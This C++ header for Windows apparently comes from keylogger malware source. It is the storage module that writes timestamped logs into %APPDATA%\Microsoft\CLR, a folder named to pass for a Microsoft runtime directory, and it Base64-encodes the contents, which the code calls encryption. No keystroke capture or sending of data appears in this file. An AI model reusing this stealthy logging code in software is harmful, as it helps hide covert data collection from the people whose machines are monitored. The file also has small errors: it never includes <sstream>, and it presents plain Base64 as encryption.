
#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string GetourPath (const bool append_seperator = false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string appdata_dir_full = appdata_dir + "\\Microsoft\\CLR";
        return appdata_dir_full + (append_seperator ? "\\" : "");
    }

    bool MakeOneDir(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool MakeDir(std::string path)
    {
        for(char &c : path)
        {
            if(c == '\\')
            {
                c = '\0';
                if (!MakeOneDir(path))
                    return false;

                c = '\\';
            }
        }
        return true;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetourPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try
        {
            std::ofstream file(path + name);
            if(!file)
                return ""; //An error occurred

            std::ostringstream os;
            os << "[" << dt.GetDateTimeString() << "]" <<
            std::endl << t << std::endl;
            std::string data = Base64::EncryptB64(os.str());
            file << data;

            if(!file)
                return ""; //An error occurred

            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }
}
#endif // IO_H
